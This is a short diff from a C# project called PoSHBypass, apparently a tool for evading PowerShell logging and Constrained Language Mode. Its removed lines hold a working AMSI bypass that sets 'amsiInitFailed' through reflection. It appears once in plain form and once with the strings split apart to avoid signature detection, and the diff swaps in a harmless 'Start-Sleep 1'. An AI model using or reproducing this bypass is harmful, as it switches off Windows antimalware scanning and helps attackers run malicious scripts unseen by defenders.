@@ -57,9 +57,7 @@ namespace PoSHBypass
         {
             try
             {
-                //string Command = @"[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.MessageBox]::Show('No PS Logging Enabled and Constrained Language Mode Bypassed!!');";
-                //string Command = @"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)";
-                string Command = @"[Ref].Assembly.GetType('Sys'+'tem.Man'+'agement.Aut'+'omation.Am'+'siUt'+'ils').GetField('am'+'siIni'+'tFailed', 'NonP'+'ublic,Sta'+'tic').SetValue($null, $true)";
+                string Command = @"Start-Sleep 1";
 
                 using (PowerShell powerShellInstance = PowerShell.Create())
                 {
